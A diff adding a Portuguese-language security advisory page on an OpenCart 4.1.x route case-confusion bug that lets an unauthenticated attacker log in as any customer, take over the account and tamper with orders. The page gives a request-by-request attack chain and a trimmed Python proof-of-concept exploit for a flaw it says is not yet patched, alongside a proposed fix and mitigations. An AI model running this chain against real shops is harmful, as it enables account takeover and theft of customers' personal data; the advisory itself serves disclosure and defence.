@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>opencart 4.1.x — confusão de maiúsculas na rota da api → takeover de conta não autenticado · chu@antisec</title>
+    <meta name="description" content="confusão de maiúsculas na rota da api de catálogo do opencart 4.1.x: o guard compara com distinção de maiúsculas, o router resolve sem essa distinção. peça Api/ em vez de api/ e o portão nunca dispara — login sem senha como qualquer cliente, takeover de conta, adulteração de pedidos. cwe-178/287/639/862, cvss 9.8. draft.">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="pt-BR" href="opencart-api-case-confusion.html">
+    <link rel="alternate" hreflang="en" href="../../research/opencart-api-case-confusion.html">
+    <link rel="alternate" hreflang="x-default" href="../../research/opencart-api-case-confusion.html">
+  </head>
+  <body>
+    <a class="skip" href="#main">pular para o conteúdo</a>
+
+    <header class="chrome">
+      <div class="wrap chrome-in">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/research$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
+          <ul>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="index.html" aria-current="page">pesquisa</a></li>
+            <li><a href="../hackthebox/index.html">writeups</a></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../research/opencart-api-case-confusion.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main">
+      <article class="wrap hero">
+
+        <p class="crumbs"><a href="index.html">← ../</a> opencart-api-case-confusion</p>
+        <h1 class="h-prompt"><span class="ps1"><b>chu@antisec</b>:~/research$</span> cat opencart-api-case-confusion.md</h1>
+        <p class="cmd">opencart 4.1.x — confusão de maiúsculas na rota da api → takeover de conta não autenticado &amp; adulteração de pedidos</p>
+
+        <ul class="meta">
+          <li class="chip">vendor=opencart</li>
+          <li class="chip">product=4.1.x</li>
+          <li class="chip chip--crit">--cvss=9.8 critical</li>
+          <li class="chip">--cwe=178</li>
+          <li class="chip">--cwe=287</li>
+          <li class="chip">--cwe=639</li>
+          <li class="chip">--cwe=862</li>
+          <li class="chip">id=ghsa (draft)</li>
+          <li class="chip chip--phos">found_by=chu</li>
+          <li class="badge badge--draft">draft</li>
+        </ul>
+        <p class="small dim">cvss v3.1 — <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> — pré-auth, remoto, sem
+          interação do usuário. validado de ponta a ponta contra o 4.1.0.3 num lab em docker.</p>
+
+        <blockquote class="stdout stdout--tldr">
+          <p>o opencart protege a api de catálogo com uma comparação de string <strong>sensível a maiúsculas</strong>
+            no prefixo da rota (<code>api/</code>), mas resolve os controladores <strong>sem essa distinção</strong>.
+            peça <code>index.php?route=Api/order&amp;call=customer</code> em vez da grafia em minúsculas e o guard
+            nunca dispara — sem allow-list, sem assinatura hmac — enquanto exatamente o mesmo controlador carrega
+            e roda.</p>
+          <p>esse endpoint faz um <strong>login sem senha como qualquer cliente</strong> cujo e-mail você conheça
+            (eles são enumeráveis). encadeie com o autorregistro aberto — que cunha um <code>customer_token</code>
+            válido que o login por override <em>não reseta</em> — e você pivota a sua sessão descartável para a conta
+            da vítima e troca a senha dela. sem credenciais, sem interação do usuário.
+            <strong>cvss 9.8, e sinceramente, faz jus.</strong></p>
+        </blockquote>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[01]</span>
+          <h2 class="sec-title">impacto</h2>
+          <span class="sec-tail">o que um atacante leva</span>
+        </div>
+        <ul class="ls">
+          <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">login não autenticado como qualquer cliente</span><span class="ls-extra">só o e-mail</span></li>
+          <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">takeover completo da conta</span><span class="ls-extra">ler pii, trocar senha + e-mail, sem senha atual</span></li>
+          <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">adulteração de pedidos não autenticada</span><span class="ls-extra">qualquer pedido, sem checagem de dono</span></li>
+          <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">a api de catálogo inteira alcançável sem assinatura</span><span class="ls-extra">cart, order, subscription, affiliate, addresses</span></li>
+        </ul>
+        <div class="prose">
+          <p>enumeração de e-mails é trivial numa loja com instalação padrão (erros de "already exists" no cadastro,
+            diferenças na
+            resposta do reset de senha), então isso escala de uma vítima escolhida a dedo para
+            <strong>comprometimento de contas em massa</strong>. adulterar pedidos é pior do que parece:
+            <code>call=history_add</code> pode virar qualquer pedido para complete/shipped, o que dispara baixa de
+            estoque, liberação de downloads digitais, comissões de afiliados e e-mails de notificação redigidos pelo
+            atacante para clientes reais. se você processa dados pessoais de titulares na eu/br, um atacante anônimo
+            lendo registros de clientes é um problema de gdpr/lgpd, não só uma entrada num bug tracker.</p>
+        </div>
+        <blockquote class="stdout">
+          <p>o que isso <strong>não</strong> é: o painel admin não está nessa cadeia. toda rota admin fora da
+            allow-list de login exige <code>isLogged()</code> + <code>user_token</code>, e não existe primitiva de
+            login admin sem senha. também não encontrei sql injection pré-auth — então nada de rce vindo só desse
+            bug. contas de clientes e pedidos apenas, o que já é bastante.</p>
+        </blockquote>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[02]</span>
+          <h2 class="sec-title">o bug</h2>
+          <span class="sec-tail">duas grafias, um controlador</span>
+        </div>
+        <div class="prose">
+          <p>todo o perímetro da api é uma única comparação na pre-action <code>startup/api</code>, que roda em cada
+            requisição de catálogo. ela decide <em>tudo</em> — allow-list e enforcement de assinatura — a partir da
+            string de rota bruta, com as maiúsculas preservadas:</p>
+        </div>
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> upload/catalog/controller/startup/api.php <span class="cap-right">php · o portão inteiro</span></figcaption>
+          <pre><code><span class="tk-c">// only these two routes may use the api, and only with a valid signature</span>
+<span class="tk-n">$allowed</span> = [<span class="tk-s">'api/order'</span>, <span class="tk-s">'api/subscription'</span>];
+
+<span class="tk-c">// block direct access to every other api controller</span>
+<span class="tk-k">if</span> (<span class="tk-f">substr</span>(<span class="tk-n">$route</span>, <span class="tk-n">0</span>, <span class="tk-n">4</span>) == <span class="tk-s">'api/'</span> &amp;&amp; !<span class="tk-f">in_array</span>(<span class="tk-n">$route</span>, <span class="tk-n">$allowed</span>)) {
+    <span class="tk-k">return new</span> \Opencart\System\Engine\<span class="tk-f">Action</span>(<span class="tk-s">'startup/api.permission'</span>); <span class="tk-c">// 403</span>
+}
+
+<span class="tk-f">if</span> (<span class="tk-f">in_array</span>(<span class="tk-n">$route</span>, <span class="tk-n">$allowed</span>)) {
+    <span class="tk-c">/* hmac request-signature validation (line 96) — skipped too, see below */</span>
+}</code></pre>
+        </figure>
+        <div class="prose">
+          <p>peça <code>route=Api/customer</code> e <code>substr('Api/customer', 0, 4)</code> retorna
+            <code>'Api/'</code> — que <strong>não é igual</strong> a <code>'api/'</code>. o bloco nunca dispara, a
+            rota também não está na allow-list, então a checagem de assinatura é pulada junto, a pre-action retorna
+            <code>null</code> e a requisição segue para o dispatch. a mesma checagem sensível a maiúsculas existe no
+            <code>startup/session.php</code>, e é por isso que a requisição que passou pelo guard anda num cookie de
+            sessão normal.</p>
+          <p>enquanto isso, o router está perfeitamente disposto a carregar esse controlador. a factory constrói um
+            nome de classe a partir da rota e checa com o <code>class_exists()</code> — que não distingue maiúsculas
+            —, e o autoloader <strong>converte o caminho para minúsculas</strong> antes do <code>include</code>:</p>
+        </div>
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> upload/system/engine/factory.php + autoloader.php <span class="cap-right">php · resolução cega a maiúsculas</span></figcaption>
+          <pre><code><span class="tk-c">// factory.php — class name built from the route, checked case-insensitively</span>
+<span class="tk-n">$class</span> = <span class="tk-s">'Opencart\\'</span> . <span class="tk-n">$application</span> . <span class="tk-s">'\Controller\\'</span>
+       . <span class="tk-f">str_replace</span>([<span class="tk-s">'_'</span>,<span class="tk-s">'/'</span>], [<span class="tk-s">''</span>,<span class="tk-s">'\\'</span>], <span class="tk-f">ucwords</span>(<span class="tk-n">$route</span>, <span class="tk-s">'_/'</span>));
+<span class="tk-k">if</span> (<span class="tk-f">class_exists</span>(<span class="tk-n">$class</span>)) { <span class="tk-k">return new</span> <span class="tk-n">$class</span>(<span class="tk-n">$this</span>-&gt;registry); }
+
+<span class="tk-c">// autoloader.php — file path is forced to lower case before include</span>
+<span class="tk-n">$file</span> = <span class="tk-n">$dir</span> . <span class="tk-f">trim</span>(<span class="tk-f">str_replace</span>(<span class="tk-s">'\\'</span>,<span class="tk-s">'/'</span>, <span class="tk-f">strtolower</span>(...)), <span class="tk-s">'/'</span>) . <span class="tk-s">'.php'</span>;</code></pre>
+        </figure>
+        <div class="prose">
+          <p>então <code>Api/customer</code> vira <code>Opencart\Catalog\Controller\Api\Customer</code>, o autoloader
+            mapeia para <code>catalog/controller/api/customer.php</code>, e o php — cujos nomes de classe já são
+            insensíveis a maiúsculas por natureza — instancia. confirmei em runtime via reflection que o fqcn pedido
+            e o namespace como declarado nem batem no caso (<code>Opencart\Catalog\…</code> pedido vs
+            <code>Opencart\catalog\…</code> declarado no fonte) e o php resolve assim mesmo. o codebase vive
+            apoiado nessa tolerância desde sempre.</p>
+          <p>uma nuance que vale saber: nem toda grafia mista sobrevive à reescrita de
+            <code>ucwords()</code> + camelCase→snake no autoloader. grafias cujo segmento <code>api</code> tem uma
+            transição interna de minúscula→maiúscula são reescritas para um caminho que não existe:</p>
+        </div>
+        <div class="tbl-wrap">
+          <table><caption class="skip">route case confusion — comportamento por caminho</caption>
+            <thead>
+              <tr><th scope="col">prefixo da rota</th><th scope="col">resultado (ao vivo, 4.1.0.3)</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><code>api/</code> (minúsculas)</td><td>http 403 — guard ativo, assinatura obrigatória</td></tr>
+              <tr><td><code>Api/</code> · <code>API/</code> · <code>aPi/</code> · <code>aPI/</code></td><td>http 200 — controlador alcançado, <strong>bypass</strong></td></tr>
+              <tr><td><code>apI/</code> · <code>ApI/</code></td><td>http 404 — classe/arquivo não resolvidos</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p class="small dim">vetor canônico da poc: <code>Api/</code>. afetados: 4.1.0.0 – 4.1.0.3 e o
+          branch <code>master</code> (4.2.0.0-dev). o 4.0.x traz um guard mais antigo, baseado em
+          <code>api_id</code>, e não tem <code>api/customer.php</code>, então a cadeia de takeover não se aplica
+          lá; o 3.x é uma arquitetura completamente diferente.</p>
+
+        <figure class="fig">
+          <div style="display:grid;gap:.7rem;grid-template-columns:1fr 1fr">
+            <img src="../../img/opencart/gate-browser-api-403.png" alt="browser: route=api/order bloqueado pelo erro de permissão" loading="lazy">
+            <img src="../../img/opencart/gate-browser-Api-200.png" alt="browser: route=Api/order chega ao controlador da api" loading="lazy">
+          </div>
+          <figcaption class="fig-cap"><b>fig 01</b> — browser: <code>api/order</code> em minúsculas é bloqueado (à
+            esquerda); <code>Api/order</code> chega ao controlador (à direita).</figcaption>
+        </figure>
+
+        <figure class="fig">
+          <div style="display:grid;gap:.7rem;grid-template-columns:1fr 1fr">
+            <img src="../../img/opencart/gate-burp-api-403.png" alt="burp: route=api/order retorna http 403 forbidden" loading="lazy">
+            <img src="../../img/opencart/gate-burp-Api-200.png" alt="burp: route=Api/order retorna http 200 ok" loading="lazy">
+          </div>
+          <figcaption class="fig-cap"><b>fig 02</b> — burp, as mesmas duas requisições: <code>api/order</code> →
+            <strong>403 forbidden</strong>; <code>Api/order</code> → <strong>200 ok</strong> sem assinatura.</figcaption>
+        </figure>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[03]</span>
+          <h2 class="sec-title">fluxo do ataque</h2>
+          <span class="sec-tail">registrar, pivotar, resetar</span>
+        </div>
+        <figure class="fig">
+          <pre>  attacker (no creds, no signature)              opencart 4.1.0.3
+    │                                                │
+    │  POST /index.php?route=account/register  ─────►│  open self-registration
+    │  ◄── customer_token (T) + own session ─────────│  T is valid, attacker-owned
+    │                                                │
+    │  POST /index.php?route=<span class="hl">Api</span>/order&amp;call=customer ─►│  substr('Api/',0,4) != 'api/'
+    │       email=victim@example.com                 │  → no 403, no hmac check
+    │                                                │  → login($email, '', true)
+    │  ◄── 200 "successfully modified customers" ────│  session.customer_id = victim
+    │                                                │    <span class="hl">T is NOT reset</span>
+    │  POST /index.php?route=account/password.save&amp;customer_token=T ─►
+    │       password=Pwned-1!                        │  no current password required
+    │  ◄── 200 "password updated" ───────────────────│
+    │                                                │
+    │  ⇒ log in as the victim. <span class="hl">account taken over</span>.   │</pre>
+        <figcaption class="fig-cap"><b>fig 03</b> — a cadeia inteira são quatro requisições e um cookie jar.</figcaption>
+      </figure>
+      <div class="prose">
+        <p>três decisões do opencart se empilham aqui.</p>
+        <p><strong>um — o login sem senha.</strong> o <code>api/customer</code> existe para ser chamado pela própria
+          camada de integração da loja, então ele simplesmente confia no e-mail que recebe:</p>
+      </div>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> api/customer.php + system/library/cart/customer.php <span class="cap-right">php</span></figcaption>
+        <pre><code><span class="tk-c">// api/customer.php — 3rd arg = $override</span>
+<span class="tk-n">$this</span>-&gt;customer-&gt;<span class="tk-f">login</span>(<span class="tk-n">$post_info</span>[<span class="tk-s">'email'</span>], <span class="tk-s">''</span>, <span class="tk-k">true</span>);
+
+<span class="tk-c">// cart/customer.php — the password check is skipped when $override === true</span>
+<span class="tk-k">if</span> (!<span class="tk-n">$override</span>) { <span class="tk-c">/* password_verify / sha1 / md5 ... */</span> }
+<span class="tk-n">$this</span>-&gt;session-&gt;data[<span class="tk-s">'customer_id'</span>] = <span class="tk-n">$customer_query</span>-&gt;row[<span class="tk-s">'customer_id'</span>]; <span class="tk-c">// authenticated</span></code></pre>
+      </figure>
+      <div class="prose">
+        <p>na requisição seguinte o <code>startup/customer</code> rehidrata a sessão e o <code>isLogged()</code> é
+          true. parabéns, você agora é a vítima.</p>
+        <p><strong>dois — o token que sobrevive a uma troca de identidade.</strong> o login por override define o
+          <code>customer_id</code> e nunca mexe no <code>session.customer_token</code>. as ações da área de conta
+          passam pelo <code>account/login.validate</code>, que só compara o <code>customer_token</code> na url com o
+          que está na sessão — e um token válido é cunhado por qualquer evento de auth, incluindo o autorregistro
+          aberto. ou seja, o token que você ganhou na sua conta descartável continua funcionando depois que a sessão
+          é pivotada para outra pessoa.</p>
+        <p><strong>três — a troca de senha que não faz perguntas.</strong> dentro da área de conta, o
+          <code>account/password.save</code> chama <code>editPassword()</code> sem exigir a senha atual. é aí que
+          mora o takeover: troque a senha da vítima e, se quiser ficar com a conta depois que ela notar, troque o
+          e-mail também.</p>
+        <p>a adulteração de pedidos é um quarto presente, à parte: <code>api/order&amp;call=history_add</code>
+          desagua no <code>addHistory()</code>, que busca o pedido apenas pelo id — o <code>getOrder()</code> no
+          <code>model/checkout/order.php</code> filtra por <code>order_id</code> sem nenhum escopo de cliente.</p>
+      </div>
+
+      <figure class="fig">
+        <img src="../../img/opencart/poc2-register-token.png" alt="burp: registrar uma conta descartável devolve um customer_token válido" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 04</b> — (a) o autorregistro aberto devolve um <code>customer_token</code>
+          válido para a conta do próprio atacante.</figcaption>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/opencart/poc1-login-override.png" alt="burp: Api/order&call=customer com o e-mail da vítima retorna success" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 05</b> — (b) <code>Api/order&amp;call=customer</code> com o e-mail da
+          vítima — sem senha, sem assinatura — retorna 200
+          <code>{"success":"You have successfully modified customers"}</code>. a sessão agora é da vítima, e o token
+          de (a) sobreviveu à troca.</figcaption>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/opencart/poc2-password-reset.png" alt="burp: account/password.save reseta a senha da vítima sem a senha antiga" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 06</b> — (c) <code>account/password.save</code> reutilizando esse mesmo
+          token → reset de senha sem a senha atual:
+          <code>{"success":"Success: Your password has been successfully updated."}</code></figcaption>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/opencart/poc2-victim-account.png" alt="página de conta renderizada mostrando os dados pessoais da vítima" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 07</b> — prova: o atacante está dentro da conta da <strong>vítima</strong>,
+          olhando os dados pessoais dela.</figcaption>
+      </figure>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[04]</span>
+        <h2 class="sec-title">poc</h2>
+        <span class="sec-tail">só em lab</span>
+      </div>
+      <p class="small dim">primeiro a checagem do guard: <code>route=api/order&amp;call=customer</code> →
+        <strong>403</strong>; <code>route=Api/order&amp;call=customer</code> → <strong>200</strong>. depois a cadeia,
+        enxugada do script completo (<code>poc_opencart_ato.py</code>, que roteia toda requisição pelo burp por
+        padrão). rode apenas contra a sua própria instância.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> poc_opencart_ato.py <span class="cap-right">python · enxuto · deps: requests</span></figcaption>
+        <pre><code><span class="tk-c">#!/usr/bin/env python3</span>
+<span class="tk-c"># poc_opencart_ato.py — opencart 4.1.x api route case-confusion -&gt; account takeover</span>
+<span class="tk-c"># affected: 4.1.0.0 - 4.1.0.3 (and master). authorized testing only.</span>
+
+<span class="tk-k">import</span> re, time, requests, urllib3
+urllib3.disable_warnings()
+
+<span class="tk-k">def</span> <span class="tk-f">token</span>(name, text):
+    m = re.<span class="tk-f">search</span>(name + <span class="tk-s">r'=([a-f0-9]+)'</span>, text)
+    <span class="tk-k">return</span> m.group(<span class="tk-n">1</span>) <span class="tk-k">if</span> m <span class="tk-k">else</span> <span class="tk-k">None</span>
+
+s = requests.<span class="tk-f">Session</span>()          <span class="tk-c"># one cookie jar, start to finish</span>
+attacker = <span class="tk-s">f"attacker_{int(time.time())}@example.invalid"</span>
+
+<span class="tk-c"># [1] register a throwaway account -&gt; mints a valid customer_token (T)</span>
+rt = <span class="tk-f">token</span>(<span class="tk-s">"register_token"</span>, s.<span class="tk-f">get</span>(base, params={<span class="tk-s">"route"</span>: <span class="tk-s">"account/register"</span>}).text)
+r = s.<span class="tk-f">post</span>(base, params={<span class="tk-s">"route"</span>: <span class="tk-s">"account/register.register"</span>, <span class="tk-s">"register_token"</span>: rt},
+           data={<span class="tk-s">"firstname"</span>: <span class="tk-s">"Mal"</span>, <span class="tk-s">"lastname"</span>: <span class="tk-s">"Lory"</span>, <span class="tk-s">"email"</span>: attacker,
+                 <span class="tk-s">"password"</span>: <span class="tk-s">"Attacker123!"</span>, <span class="tk-s">"agree"</span>: <span class="tk-s">"1"</span>})
+ct = <span class="tk-f">token</span>(<span class="tk-s">"customer_token"</span>, r.text)
+<span class="tk-f">print</span>(<span class="tk-s">f"[1] registered {attacker} -&gt; customer_token={ct}"</span>)
+
+<span class="tk-c"># [2] the case confusion: Api/ skips the gate AND the signature check.</span>
+<span class="tk-c">#     password-less override login -&gt; session pivots to the victim, T survives</span>
+r = s.<span class="tk-f">post</span>(base, params={<span class="tk-s">"route"</span>: <span class="tk-s">"Api/order"</span>, <span class="tk-s">"call"</span>: <span class="tk-s">"customer"</span>},
+           data={<span class="tk-s">"firstname"</span>: <span class="tk-s">"x"</span>, <span class="tk-s">"lastname"</span>: <span class="tk-s">"y"</span>, <span class="tk-s">"email"</span>: victim})
+<span class="tk-k">if</span> <span class="tk-s">'"success"'</span> <span class="tk-k">not in</span> r.text:
+    sys.<span class="tk-f">exit</span>(<span class="tk-s">"[!] override login failed (patched?)"</span>)
+<span class="tk-f">print</span>(<span class="tk-s">f"[2] pivoted session to victim '{victim}'"</span>)
+
+<span class="tk-c"># [3] reset the victim's password with the attacker's token (no current pw)</span>
+r = s.<span class="tk-f">post</span>(base, params={<span class="tk-s">"route"</span>: <span class="tk-s">"account/password.save"</span>, <span class="tk-s">"customer_token"</span>: ct},
+           data={<span class="tk-s">"password"</span>: new_pw, <span class="tk-s">"confirm"</span>: new_pw})
+<span class="tk-f">print</span>(<span class="tk-s">f"[3] victim password reset -&gt; '{new_pw}'"</span>)
+
+<span class="tk-c"># [4] log in as the victim with the new password. account taken over.</span></code></pre>
+      </figure>
+      <p class="small dim">resultado no lab no 4.1.0.3: o hash bcrypt da vítima mudou, e o login com a senha
+        definida pelo atacante funcionou como <code>customer_id=1</code> — a vítima.</p>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[05]</span>
+        <h2 class="sec-title">status da disclosure</h2>
+        <span class="sec-tail">a parte honesta</span>
+      </div>
+      <ul class="tl">
+        <li class="is-done"><span class="t-date">2026-06-05</span><span class="t-what">descoberta &amp; validação</span>
+          <span class="t-note">revisão do fonte, depois um lab em docker com o 4.1.0.3 no ar — cadeia completa
+            reproduzida de ponta a ponta.</span></li>
+        <li class="is-done"><span class="t-date">2026-06-06</span><span class="t-what">advisory escrito + patch proposto</span>
+          <span class="t-note">o fix eu escrevi (<code>fix-opencart-api-case-confusion.patch</code>); é uma
+            proposta, não algo que o opencart tenha publicado.</span></li>
+        <li class="is-now"><span class="t-date">pendente</span><span class="t-what">ghsa — rascunhado, não registrado</span>
+          <span class="t-note">o rascunho do advisory está pronto para seguir pelo canal privado de reporte do
+            fornecedor. ainda não existe id de ghsa, então não há o que linkar aqui.</span></li>
+        <li class="is-now"><span class="t-date">pendente</span><span class="t-what">resposta do fornecedor</span>
+          <span class="t-note">nada em arquivo. nada recebido, nada confirmado, nada negado.</span></li>
+        <li class="is-now"><span class="t-date">pendente</span><span class="t-what">cve</span>
+          <span class="t-note">não atribuída — referenciada como <code>CVE-XXXX-XXXXX</code> até existir uma.</span></li>
+      </ul>
+      <blockquote class="stdout">
+        <p>status, sem rodeio: <strong>sem cve, sem id de ghsa, sem resposta do fornecedor, sem release corrigida.</strong>
+          o diff na próxima seção é meu. os detalhes weaponizados completos ficam nesta página limitados ao
+          necessário para entender e defender, e a timeline aqui é atualizada no instante em que qualquer uma dessas
+          coisas mudar.</p>
+      </blockquote>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[06]</span>
+        <h2 class="sec-title">fix &amp; mitigações</h2>
+        <span class="sec-tail">proposto, não mergeado</span>
+      </div>
+      <div class="prose">
+        <p>o fix de raiz é chato de propósito: nunca tome uma decisão de segurança sobre uma string bruta com
+          maiúsculas preservadas que um resolvedor insensível a maiúsculas vai honrar logo em seguida. normalize a
+          rota (ou decida com base na classe do controlador resolvido), e aplique o mesmo no
+          <code>startup/session.php</code>:</p>
+      </div>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> fix-opencart-api-case-confusion.patch <span class="cap-right">diff · proposto pelo pesquisador</span></figcaption>
+        <pre><code><span class="tk-c">--- a/upload/catalog/controller/startup/api.php</span>
+<span class="tk-c">+++ b/upload/catalog/controller/startup/api.php</span>
+ 		$allowed = ['api/order', 'api/subscription'];
+<span class="tk-k">+</span>
+<span class="tk-k">+</span>		<span class="tk-c">// Normalise the route so the API restriction cannot be bypassed via case</span>
+<span class="tk-k">+</span>		<span class="tk-c">// variation such as "Api/customer" (PHP resolution is case-insensitive).</span>
+<span class="tk-k">+</span>		$route = strtolower($route);
+
+ 		if (substr($route, 0, 4) == 'api/' &amp;&amp; !in_array($route, $allowed)) {
+ 			return new \Opencart\System\Engine\Action('startup/api.permission');
+ 		}
+<span class="tk-c">--- a/upload/catalog/controller/startup/session.php</span>
+<span class="tk-c">+++ b/upload/catalog/controller/startup/session.php</span>
+<span class="tk-c">-		if (... substr((string)$this-&gt;request-&gt;get['route'], 0, 4) == 'api/' ...) {</span>
+<span class="tk-k">+</span>		<span class="tk-k">if</span> (... <span class="tk-f">substr</span>(<span class="tk-f">strtolower</span>((string)<span class="tk-n">$this</span>-&gt;request-&gt;get[<span class="tk-s">'route'</span>]), <span class="tk-n">0</span>, <span class="tk-n">4</span>) == <span class="tk-s">'api/'</span> ...) {
+<span class="tk-c">--- a/upload/system/library/cart/customer.php</span>
+<span class="tk-c">+++ b/upload/system/library/cart/customer.php</span>
+ 			$this-&gt;session-&gt;data['customer_id'] = $customer_query-&gt;row['customer_id'];
+<span class="tk-k">+</span>
+<span class="tk-k">+</span>		<span class="tk-c">// Drop any pre-existing token so an identity change cannot inherit a</span>
+<span class="tk-k">+</span>		<span class="tk-c">// token bound to a different account.</span>
+<span class="tk-k">+</span>		unset($this-&gt;session-&gt;data['customer_token']);</code></pre>
+      </figure>
+      <div class="prose">
+        <h3>defesa em profundidade (para quem mantém)</h3>
+        <ul>
+          <li>o <code>api/customer</code> não deve fazer login por override fora de um contexto de sessão de api
+            verificado.</li>
+          <li>regenere a sessão e resete o <code>customer_token</code> a cada troca de identidade — um token velho
+            nunca pode seguir um <code>customer_id</code> trocado.</li>
+          <li>o <code>account/password.save</code> e o <code>account/edit</code> deveriam exigir a senha atual ou
+            uma checagem step-up.</li>
+          <li>o <code>getOrder()</code> / <code>addHistory()</code> da api deve escopar pedidos pelo cliente
+            autenticado.</li>
+        </ul>
+        <h3>se você roda uma loja opencart 4.1.x hoje</h3>
+        <ul>
+          <li>bloqueie, no web server ou no waf, qualquer requisição a <code>index.php</code> cujo <code>route</code>
+            bata com <code>(?i)^api/</code> mas não seja exatamente <code>api/...</code> em minúsculas.</li>
+          <li>desative o usuário da api de catálogo se você não usa ele ativamente.</li>
+          <li>faça hunt para trás: logs de acesso com letras maiúsculas dentro do segmento <code>api</code> da rota,
+            trocas de senha/e-mail sem um <code>account/login.login</code> antes, e inserts de histórico de pedido
+            que não vieram do admin nem de uma chamada de api assinada.</li>
+        </ul>
+      </div>
+    </article>
+  </main>
+
+  <footer class="foot">
+    <div class="wrap">
+      <div class="foot-row">
+        <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
+      </div>
+      <div class="foot-row">
+        <p>© 2026 chu · <a href="../../index.html">início</a> · <a href="../about.html#contact">contato</a></p>
+      </div>
+    </div>
+  </footer>
+  <script src="../../zoom.js" defer></script>
+</body>
+</html>
